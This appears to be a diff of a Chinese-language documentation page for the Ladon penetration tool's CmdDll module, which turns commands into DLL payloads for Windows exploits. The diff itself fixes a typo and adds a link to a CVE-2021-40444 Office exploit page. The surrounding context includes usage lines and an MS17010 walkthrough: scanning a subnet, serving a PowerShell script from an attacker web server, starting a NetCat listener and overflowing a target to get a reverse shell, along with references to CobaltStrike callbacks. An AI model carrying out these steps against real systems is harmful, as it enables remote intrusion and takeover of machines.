@@ -201,7 +201,7 @@ window.location.href="http://k8gege.org/Ladon/cmddll.html";
 </script>
 
 
-<h3 id="Ladon8-9更新功能"><a href="#Ladon8-9更新功能" class="headerlink" title="Ladon8.9更新功能"></a>Ladon8.9更新功能</h3><p>20210920<br>[+]CmdDll Windows 0day漏洞通用DLL注入生成器，生成的DLL仅5KB，非常适0day加载</p>
+<h3 id="Ladon8-9更新功能"><a href="#Ladon8-9更新功能" class="headerlink" title="Ladon8.9更新功能"></a>Ladon8.9更新功能</h3><p>20210920<br>[+]CmdDll Windows 0day漏洞通用DLL注入生成器，生成的DLL仅5KB，非常适合0day加载</p>
 <p>2021.9.15<br>[u]webscan CS保留<br>[u]CmdDll 去除黑框</p>
 <p>2021.9.14<br>[+]CVE-2021-40444 Microsoft MSHTML远程代码执行漏洞，Office文档利用模块<br>影响版本: 包括Windows 7/8/8.1/10，Windows Server 2008/2008R2/2012/2012R2/2016/2019/2022<br>[+]CmdDll cmd转DLL(Win系统0day漏洞DLL执行命令payload，可直接powershell上线CobaltStrike)<br>   溢出漏洞如MS17010、本地提权CVE-2021-1675等，非溢出如最新的Office漏洞CVE-2021-40444等</p>
 <h3 id="CMD用法"><a href="#CMD用法" class="headerlink" title="CMD用法"></a>CMD用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">Ladon CmdDll x86 calc</span><br><span class="line">Ladon CmdDll x64 calc</span><br><span class="line">Ladon CmdDll b64x86 YwBhAGwAYwA=</span><br><span class="line">Ladon CmdDll b64x64 YwBhAGwAYwA=</span><br></pre></td></tr></table></figure>
@@ -218,6 +218,8 @@ window.location.href="http://k8gege.org/Ladon/cmddll.html";
 <h4 id="MS17010漏洞NC反弹演示"><a href="#MS17010漏洞NC反弹演示" class="headerlink" title="MS17010漏洞NC反弹演示"></a>MS17010漏洞NC反弹演示</h4><p>可能有些机器存在杀软查杀CS，导致无法直接上线CS，这时我们可使用NC或MSF上线</p>
 <p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>2 打开LadonGui-NetCat-启动监听，默认监听本机4444端口,使用 Ladon web 800 启动WEB，在GUI里填写对应PS1的下载地址，如<a href="http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听" target="_blank" rel="noopener">http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听</a><br>3 LadonGUI-CmdDLL-填写IP和端口，生成NC x86的DLL(目标32位系统)<br>4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机，成功反弹shell</p>
 <p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_nc.gif"></p>
+<p>####　CVE-2021-40444 Office漏洞复现CS上线</p>
+<p><a href="http://k8gege.org/Ladon/CVE-2021-40444.html">http://k8gege.org/Ladon/CVE-2021-40444.html</a></p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.9版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
